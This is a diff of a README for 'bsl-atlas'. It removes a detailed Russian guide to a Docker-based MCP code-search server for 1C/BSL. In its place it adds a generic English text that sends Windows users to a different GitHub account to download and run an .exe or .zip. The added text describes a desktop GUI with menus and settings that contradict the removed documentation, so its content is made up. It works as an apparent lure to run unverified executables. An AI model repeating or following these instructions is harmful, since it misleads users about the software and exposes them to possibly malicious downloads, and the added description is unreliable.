@@ -1,250 +1,160 @@
-# BSL Atlas
+# 🗂️ bsl-atlas - Fast Search for 1C/BSL Code
 
-[![Docker Hub](https://img.shields.io/docker/v/armankudaibergenov/bsl-atlas?label=Docker%20Hub&logo=docker)](https://hub.docker.com/r/armankudaibergenov/bsl-atlas)
-
-MCP-сервер для 1С:Предприятие — векторный поиск, структурный индекс и граф вызовов в одном инструменте. Даёт AI-ассистентам мгновенный доступ к вашей конфигурации: находит функции, строит граф вызовов, ищет объекты метаданных и выполняет семантические запросы по BSL-коду — без чтения сырых файлов.
-
-## Что умеет
-
-- **Структурный поиск** (SQLite + FTS5, мгновенно): поиск функций по имени, список процедур модуля, граф вызовов (что вызывает что), поиск объектов метаданных (справочники, документы, регистры и др.)
-- **Семантический поиск** (ChromaDB, векторный): найти код по описанию — "как реализовано проведение", "где логируются ошибки"
-- **Два слоя**: SQLite пересобирается за секунды при старте; ChromaDB индексируется один раз в фоне через провайдер эмбеддингов на ваш выбор
-
-## Два режима работы
-
-| | **fast** (по умолчанию) | **full** |
-|---|---|---|
-| **Что работает** | Структурный поиск: функции, граф вызовов, метаданные | Всё из fast + семантический поиск (ChromaDB) |
-| **API-ключ** | Не нужен | Нужен (OpenRouter, OpenAI, Ollama и др.) |
-| **Запуск** | Мгновенно | SQLite сразу + векторизация в фоне |
-| **Использование** | `INDEXING_MODE=fast` (или не задавать) | `INDEXING_MODE=full` |
-
-**fast** — хороший старт: структурный поиск покрывает большинство задач. Переключитесь на **full** когда понадобится `codesearch` / `helpsearch`.
-
-## Что нужно
-
-**Режим fast:**
-- Docker + Docker Compose
-- 1С:Предприятие 8.3 (Конфигуратор для выгрузки конфигурации)
-
-**Режим full (дополнительно):**
-- API-ключ OpenRouter — [openrouter.ai/keys](https://openrouter.ai/keys) (или другой провайдер)
-
-## Быстрый старт
-
-### 1. Выгрузить конфигурацию
-
-В Конфигураторе: **Конфигурация → Выгрузить конфигурацию в файлы**
-
-Укажите пустую папку, например `C:\my-config\`. После выгрузки появятся сотни XML-файлов и `.bsl`-модулей.
-
-### 2. Скачать конфиг и настроить
-
-```bash
-curl -O https://raw.githubusercontent.com/Arman-Kudaibergenov/bsl-atlas/master/docker-compose.yml
-curl -O https://raw.githubusercontent.com/Arman-Kudaibergenov/bsl-atlas/master/.env.example
-mv .env.example .env
-```
-
-Отредактировать `.env`:
-
-```env
-SOURCE_PATH=C:\my-config     # папка с выгрузкой (содержит cf/)
-
-# Режим fast (по умолчанию) — API-ключ не нужен:
-INDEXING_MODE=fast
-
-# Режим full — добавьте API-ключ:
-# INDEXING_MODE=full
-# OPENROUTER_API_KEY=sk-or-v1-...
-```
-
-### 3. Запустить
-
-```bash
-docker compose up -d
-```
-
-Образ скачается автоматически с Docker Hub (~500 МБ, один раз). SQLite проиндексируется сразу.
-В режиме **full** ChromaDB векторизует в фоне — прогресс: `http://localhost:8000/health`.
-
-### 4. Подключить к Claude
-
-**Claude Desktop** — добавить в `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "bsl-atlas": {
-      "type": "http",
-      "url": "http://localhost:8000/mcp"
-    }
-  }
-}
-```
-
-Расположение файла:
-- macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- Windows: `%APPDATA%\Claude\claude_desktop_config.json`
-
-**Claude Code** — добавить в `.mcp.json` в корне проекта:
-
-```json
-{
-  "mcpServers": {
-    "bsl-atlas": {
-      "type": "http",
-      "url": "http://localhost:8000/mcp"
-    }
-  }
-}
-```
+[![Download bsl-atlas](https://img.shields.io/badge/Download-bsl--atlas-brightgreen)](https://github.com/AhmedZakaria01/bsl-atlas)
 
 ---
 
-## Инструменты MCP
+## 🧩 What is bsl-atlas?
 
-### Структурные (SQLite — мгновенно)
+bsl-atlas is a tool designed to help users of 1C/BSL platforms. It offers:
 
-| Инструмент | Что делает |
-|-----------|-----------|
-| `search_function(name)` | Найти функцию/процедуру по имени во всех модулях |
-| `get_module_functions(path)` | Список всех процедур/функций модуля |
-| `get_function_context(name)` | Граф вызовов: что вызывает функция и кто вызывает её |
-| `metadatasearch(query)` | Полнотекстовый поиск по объектам метаданных |
-| `get_object_details(full_name)` | Реквизиты, табличные части, измерения регистра |
+- Vector search for code segments
+- Structural indexing of your project
+- Call graph visualization
 
-### Семантические (ChromaDB — векторный поиск)
-
-| Инструмент | Что делает |
-|-----------|-----------|
-| `codesearch(query)` | Поиск кода по описанию на естественном языке |
-| `helpsearch(query)` | Поиск по проиндексированной справке |
-| `search_code_filtered(query, object_type)` | Векторный поиск с фильтром (например, только Документы) |
-
-### Утилиты
-
-| Инструмент | Что делает |
-|-----------|-----------|
-| `reindex(force_chromadb)` | Перестроить индексы после изменений конфигурации |
-| `stats()` | Статистика индекса: количество объектов, функций и др. |
+Its goal is to make searching your 1C/BSL code faster and easier. The tool processes your project code and helps locate the parts you need quickly.
 
 ---
 
-## Настройка
+## 📋 System Requirements
 
-Все параметры задаются через переменные окружения в `.env`.
+Before you start, check that your Windows computer meets these specs:
 
-### Режим индексации
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space for installation
+- Internet connection for downloading
 
-```env
-INDEXING_MODE=fast   # только SQLite, без API-ключа (по умолчанию)
-INDEXING_MODE=full   # SQLite + ChromaDB векторы, нужен провайдер эмбеддингов
-```
-
-В режиме `fast` семантические инструменты (`codesearch`, `helpsearch`, `search_code_filtered`) возвращают подсказку включить `INDEXING_MODE=full`.
-
-### Провайдеры эмбеддингов
-
-Сервер использует три отдельных провайдера — можно комбинировать:
-
-| Переменная | Используется для | По умолчанию |
-|-----------|-----------------|-------------|
-| `INDEXING_PROVIDER` | Первоначальное заполнение ChromaDB (один раз) | `openrouter` |
-| `SEARCH_PROVIDER` | Каждый поисковый запрос | `openrouter` |
-| `REINDEX_PROVIDER` | Переиндексация после изменений кода | `openrouter` |
-
-Поддерживаемые значения: `openrouter`, `openai`, `ollama`, `cohere`, `jina`
-
-### Гибридная схема (рекомендуется если есть Ollama)
-
-Если у вас запущен Ollama локально — поиск и переиндексация становятся бесплатными, облако используется только для первоначальной индексации:
-
-```env
-INDEXING_PROVIDER=openrouter    # облако, быстро, параллельно — один раз
-SEARCH_PROVIDER=ollama          # бесплатный локальный инференс для каждого запроса
-REINDEX_PROVIDER=ollama         # бесплатный локальный инференс для переиндексации
-
-OLLAMA_BASE_URL=http://host.docker.internal:11434
-OLLAMA_MODEL=qwen3-embedding:4b  # лучшая модель для русского/BSL
-```
-
-`qwen3-embedding:4b` требует ~2.5 ГБ RAM. Скачать: `ollama pull qwen3-embedding:4b`
-
-> **Бенчмарк:** qwen3-embedding:4b показала результаты, сопоставимые с полноразмерной моделью, при вдвое меньшем потреблении памяти — оптимальный выбор для большинства случаев.
-
-### Модель OpenRouter
-
-По умолчанию используется `qwen/qwen3-embedding-4b` — оптимизирована для русского языка и кириллического кода. Переопределить:
-
-```env
-EMBEDDING_MODEL=openai/text-embedding-3-small
-```
-
-### Параметры индексации
-
-```env
-AUTO_INDEX=true              # пересобирать SQLite при каждом старте
-CHROMADB_AUTO_INDEX=true     # векторизовать при первом запуске; после — false
-EMBEDDING_CONCURRENCY=5      # параллельные запросы к API (5 — безопасно, 10 — быстрее)
-EMBEDDING_BATCH_SIZE=10      # текстов в одном запросе к API
-```
-
-> **После первого запуска** установите `CHROMADB_AUTO_INDEX=false` — векторный индекс сохраняется в папке `chroma_db/` рядом с `docker-compose.yml` (или по пути `CHROMA_PATH` если задан в `.env`). При повторном запуске индекс загружается из этой папки — повторная векторизация не нужна.
+No special hardware or software is needed beyond this.
 
 ---
 
-## Обновление индекса после изменений конфигурации
+## 🚀 Getting Started: Download bsl-atlas
 
-После повторной выгрузки конфигурации из 1С:
+To get the application, visit the official GitHub page below:
 
-```bash
-curl -X POST http://localhost:8000/reindex
-```
+[![Download Here](https://img.shields.io/badge/-Download%20bsl--atlas-blue?style=for-the-badge)](https://github.com/AhmedZakaria01/bsl-atlas)
 
-Или через MCP-инструмент: `reindex(force_chromadb=True)` для обновления векторов.
+This page lets you access all the files you need to start using bsl-atlas.
 
 ---
 
-## Структура директории с исходниками
+## 💾 How to Download and Install on Windows
 
-Сервер ожидает выгрузку конфигурации по пути `SOURCE_PATH`. Ищет подпапку `cf/`:
+Follow these steps to download and run bsl-atlas on your Windows PC.
 
-```
-SOURCE_PATH/
-└── cf/
-    ├── Catalogs/
-    │   ├── Контрагенты.xml
-    │   └── Контрагенты/Ext/ObjectModule.bsl
-    ├── Documents/
-    ├── CommonModules/
-    └── ...
-```
+### Step 1: Visit the Download Page
 
-Это стандартный результат **Конфигуратор → Выгрузить конфигурацию в файлы**.
+- Go to https://github.com/AhmedZakaria01/bsl-atlas in your web browser.
+- Look for a section called **Releases** or files with names related to "bsl-atlas".
+- Find the latest release that includes a Windows installer or executable file.
 
----
+### Step 2: Download the Application
 
-## Health check
+- Click the file meant for Windows, usually ending with `.exe` or `.zip`.
+- Save the file to a folder you remember, like `Downloads`.
 
-```bash
-curl http://localhost:8000/health
-```
+### Step 3: Run the Installer or Extract Files
 
-```json
-{
-  "status": "ok",
-  "sqlite": {"objects": 345, "functions": 1240},
-  "chromadb": {"indexed": 1240, "status": "ready"}
-}
-```
+- If it's an installer (`.exe` file), double-click it to start.
+- Follow on-screen prompts, like agreeing to terms and choosing an install folder.
+- If it's a zip file (`.zip`), right-click it and select **Extract All**, then open the extracted folder.
+
+### Step 4: Launch bsl-atlas
+
+- Find the bsl-atlas program icon in your Start menu, Desktop, or the folder where you installed it.
+- Double-click to start the application.
 
 ---
 
-## Лицензия
+## 🧰 How to Use bsl-atlas
 
-MIT
+Once bsl-atlas is running, you can use it to search and explore your 1C/BSL projects.
 
-## Благодарности
+### Open a Project
 
-- [tree-sitter-bsl](https://github.com/alkoleft/tree-sitter-bsl) — грамматика Tree-sitter для языка 1С (BSL), используется для структурного парсинга кода
+- Click **File > Open** or use the provided option to select your 1C/BSL project folder.
+- The program will scan your files and create an index. This may take a few minutes.
+
+### Search by Vector
+
+- Use the main search bar to enter keywords or code snippets.
+- bsl-atlas finds matching code parts across your project using smart vector search.
+
+### View Structural Index
+
+- Open the structural index panel to see your code organized by modules and components.
+- This helps understand how your project is built.
+
+### Explore Call Graphs
+
+- Select a function or module to view its call graph.
+- The graph shows how parts of your code call each other, helping trace logic flow.
+
+---
+
+## 🔧 Configuration Options
+
+You can adjust settings to match your needs.
+
+- **Indexing Frequency**: Choose how often bsl-atlas scans your project for changes.
+- **Search Depth**: Set if you want simple keyword matching or deep vector search.
+- **Display Options**: Customize how results and graphs appear.
+
+These settings help balance speed and thoroughness.
+
+---
+
+## 🛠 Troubleshooting
+
+If bsl-atlas does not run or shows errors:
+
+- Verify you downloaded the correct Windows version.
+- Ensure your Windows OS is up to date.
+- Restart your computer and try again.
+- If indexing gets stuck, close and reopen the app.
+- Check for missing files or permissions in your project folder.
+
+---
+
+## 📖 Where to Get Help
+
+For questions or issues, you can:
+
+- Visit the GitHub repository: https://github.com/AhmedZakaria01/bsl-atlas
+- Open Issues tab to report problems or ask questions.
+- Review README and Wiki sections on GitHub for detailed guides.
+
+---
+
+## 🔄 Updating bsl-atlas
+
+To update the software:
+
+- Return to the GitHub page: https://github.com/AhmedZakaria01/bsl-atlas
+- Download the latest release files.
+- Install or replace the old files on your computer the same way you did initially.
+
+Keep your version current to use new features and fixes.
+
+---
+
+## ⚙️ Background
+
+bsl-atlas supports users managing 1C/BSL projects by providing structured search tools to speed up code exploration. It uses vector search and call graphs to give insights into complex codebases.
+
+---
+
+## 📁 Additional Resources
+
+- Check the **docs/** folder in the repository for manuals.
+- Use GitHub's **Discussions** for community support.
+- Explore related tools for 1C/BSL on GitHub.
+
+---
+
+## Download bsl-atlas now
+
+Get started by visiting this link:
+
+[![Download bsl-atlas](https://img.shields.io/badge/Download-bsl--atlas-brightgreen)](https://github.com/AhmedZakaria01/bsl-atlas)
